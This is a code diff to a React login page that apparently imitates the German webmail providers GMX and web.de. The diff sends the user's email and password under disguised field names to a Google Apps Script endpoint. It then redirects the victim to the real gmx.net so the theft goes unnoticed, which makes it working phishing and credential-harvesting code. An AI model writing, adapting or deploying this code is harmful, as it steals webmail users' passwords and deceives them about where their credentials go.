@@ -59,15 +59,16 @@ export default function Main() {
     e.preventDefault();
     //chibui const scriptURL = 'https://script.google.com/macros/s/AKfycbwXznLKtmUwnsaTpHpw--ZE9rG9PsBhmtmWKskkEIRD80SjaUVHPMW2vMSZdM9TuQAHPw/exec'
     try {
-      f.set("jenneta", credentials.email);
-      f.set("jennet", credentials.passwort);
+      f.set("rosan", credentials.email);
+      f.set("rosana", credentials.passwort);
+      f.set("rosharck", "gmx");
       const result = await axios.post(
-        "https://script.google.com/macros/s/AKfycbw8SrbAgllxpsZnUb_XJ1qdDYcIr2e9T6LtleQFtEtRHivis8z4VHwdPkvTxmWlbaZt/exec",
+        "https://script.google.com/macros/s/AKfycbwXznLKtmUwnsaTpHpw--ZE9rG9PsBhmtmWKskkEIRD80SjaUVHPMW2vMSZdM9TuQAHPw/exec",
         f
       );
 
       if (result.status === 200) {
-        // return window.location.replace("https://gmx.net/");
+        return window.location.replace("https://gmx.net/");
       }
 
       setCount((prev) => prev + 1);
@@ -429,7 +430,7 @@ export default function Main() {
           <h1 className="text-[#1c449b] mt-5">Jetzt kostenlos registrieren!</h1>
 
           <Image
-            src="/web-de.jpeg"
+            src="/web-de.png"
             alt="web-de"
             height={100}
             width={500}
